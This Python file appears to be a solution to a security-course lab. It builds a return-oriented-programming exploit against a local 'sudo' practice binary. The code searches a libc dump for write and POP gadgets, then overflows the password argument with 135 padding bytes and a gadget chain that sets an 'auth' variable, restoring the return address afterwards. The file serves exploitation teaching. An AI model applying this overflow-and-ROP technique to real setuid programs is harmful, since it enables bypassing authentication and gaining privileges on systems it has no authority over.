import os
import sys
import base64
import struct

import addresses
from infosec.core import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to execute our ROP Write Gadget, modify the
    `auth` variable and print `Victory!`. Make sure to return a `bytes` object
    and not an `str` object.

    NOTES:
    1. Use `addresses.AUTH` to get the address of the `auth` variable.
    2. Don't write addresses of gadgets directly - use the search object to
       find the address of the gadget dynamically.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """
    search = GadgetSearch(LIBC_DUMP_PATH)
    
    all_write_gadgets = search.find_all_formats("MOV [{0}], {1}")
    
    if len(all_write_gadgets) < 1:
        return None # Can't move values
        
    rop_chain = b""
    seen_gadgets = set()
    
    for gadget_str, write_gadget_addr in all_write_gadgets:
        # find_all_formats returns duplicates, and there's no need to check the same gadget but
        # with a different address
        if gadget_str in seen_gadgets:
            continue
        seen_gadgets.add(gadget_str)
        
        registers = gadget_str.replace("MOV [", "").replace("],","").split()
        reg_auth, reg_1 = registers[0], registers[1]
        
        try:
            pop_auth = search.find(f"POP {reg_auth}")
            pop_1 = search.find(f"POP {reg_1}")

            rop_chain += struct.pack('<L', pop_auth)
            rop_chain += addresses.address_to_bytes(addresses.AUTH)
            rop_chain += struct.pack('<L', pop_1)
            rop_chain += struct.pack('<I', 1)
            rop_chain += struct.pack('<L', write_gadget_addr)
            break
        except:
            continue
    
    
    offset = 135 * b'\x61'    
    original_ret_address = addresses.address_to_bytes(addresses.CHECK_PASSWORD_RET)
    
    return None if not rop_chain else offset + rop_chain + original_ret_address


def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)
